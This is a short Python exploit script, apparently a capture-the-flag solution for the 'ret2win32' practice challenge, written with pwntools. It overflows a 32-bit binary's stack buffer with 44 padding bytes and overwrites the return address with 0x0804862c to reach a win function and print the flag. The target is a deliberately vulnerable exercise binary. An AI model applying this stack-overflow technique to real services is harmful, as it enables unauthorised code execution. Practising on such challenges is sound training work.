#!/usr/bin/env python3

from pwn import *

exe = ELF("./ret2win32_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    ret2win = 0x0804862c
    offset = 44
    r.sendlineafter(b'> ', b'A'*offset + p32(ret2win))

    r.recv()
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
